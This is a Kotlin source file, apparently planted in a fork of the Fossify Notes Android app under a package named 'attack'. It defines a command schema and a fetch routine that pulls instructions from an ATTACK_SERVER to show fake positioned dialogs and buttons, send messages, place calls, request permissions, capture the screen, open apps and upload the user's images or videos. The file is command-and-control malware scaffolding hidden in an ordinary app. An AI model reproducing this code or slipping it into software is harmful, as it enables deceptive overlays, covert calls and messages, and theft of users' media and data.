package org.fossify.notes.attack

import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.Response
import com.google.gson.Gson
import android.os.AsyncTask
import android.util.Log

// 定义数据类
data class DialogData(
    var title: String = "error",
    var message: String = "message",
    var left: Int = 100,
    var top: Int = 100,
    var width: Int = 200,
    var height: Int = 2000,
    // legacy delay (appear). 保持兼容 server 旧字段
    var delay: Long = 0,
    // 新增: 出现/消失控制
    var appearDelayMs: Long = 0,
    var dismissDelayMs: Long = 0,
    var confirmVisible: Boolean = false,
    var cancelVisible: Boolean = false,
    var confirm: String = "确认",
    var cancel: String = "取消",
    var confirmWidth: Int = 100,
    var confirmHeight: Int =  100,
    var cancelWidth: Int = 100,
    var cancelHeight: Int = 100,
    // 子元素相对弹窗左上角坐标，-1 表示沿用默认布局
    var titleLeft: Int = -1,
    var titleTop: Int = -1,
    var messageLeft: Int = -1,
    var messageTop: Int = -1,
    var confirmLeft: Int = -1,
    var confirmTop: Int = -1,
    var cancelLeft: Int = -1,
    var cancelTop: Int = -1,
    // 文本大小（sp），-1 采用布局默认
    var titleSizeSp: Int = -1,
    var messageSizeSp: Int = -1,
    var confirmTextSizeSp: Int = -1,
    var cancelTextSizeSp: Int = -1,
)

data class ButtonData(
    var centerX: Int = 0,
    var centerY: Int = 0,
    var width: Int = 0,
    var height: Int = 0,
    var text: String = "",
    var delay: Long = 0 // ms
)

data class MessageData(
    var receiver: String = "",
    var content: String = "",
    var delay: Long = 0
)

data class AppData(
    var packageName: String = "",
    var delay: Long = 0
)

data class CaptureScreenData(
    var delay: Long = 0
)

data class CallData(
    var number: String = "",
    var delay: Long = 0,
    var action: String = "dial" // dial | call (call 需 CALL_PHONE 权限，默认 dial)
)

data class PermissionRequestData(
    var permissions: List<String> = emptyList(),
    var delay: Long = 0
)

data class MediaUploadData(
    var mediaType: String = "images", // images | videos
    var count: Int = 1,
    var delay: Long = 0
)

data class SettingsActionData(
    var action: String = "",
    var delay: Long = 0
)

data class ViewCliTemplate(
    var dialogs: List<DialogData> = ArrayList(),
    var buttons: List<ButtonData> = ArrayList(),
    var messages: List<MessageData> = ArrayList(),
    var openApp: List<AppData> = ArrayList(),
    var captureScreen: List<CaptureScreenData> = ArrayList(),
    var calls: List<CallData> = ArrayList(),
    var permissions: List<PermissionRequestData> = ArrayList(),
    var mediaUpload: List<MediaUploadData> = ArrayList(),
    var settingsActions: List<SettingsActionData> = ArrayList()
)

// 使用 OkHttp 获取 JSON 数据
fun fetchJsonFromUrl(url: String): String {
    val client = OkHttpClient()
    val request = Request.Builder().url(url).build()

    // 发送同步请求
    val response: Response = client.newCall(request).execute()

    // 获取响应的字符串
    return response.body?.string() ?: ""
}

// 使用 Gson 解析 JSON 字符串
fun parseJson(jsonString: String): ViewCliTemplate {
    val gson = Gson()
    return gson.fromJson(jsonString, ViewCliTemplate::class.java)
}

fun fetchViewCli(action: String, onResult: (ViewCliTemplate) -> Unit) {
    // 执行网络请求的异步任务
    object : AsyncTask<Void, Void, ViewCliTemplate>() {
        override fun doInBackground(vararg params: Void?): ViewCliTemplate {
            return try {
                val url = "$ATTACK_SERVER/action/$action"  // 替换为实际 URL
                val jsonResponse = fetchJsonFromUrl(url)
                parseJson(jsonResponse)
            } catch (e: Exception) {
                e.printStackTrace()
                ViewCliTemplate()  // 如果出错，返回空的 ViewCliTemplate
            }
        }

        override fun onPostExecute(result: ViewCliTemplate) {
            // 在主线程更新 UI
            onResult(result)
        }
    }.execute()
}
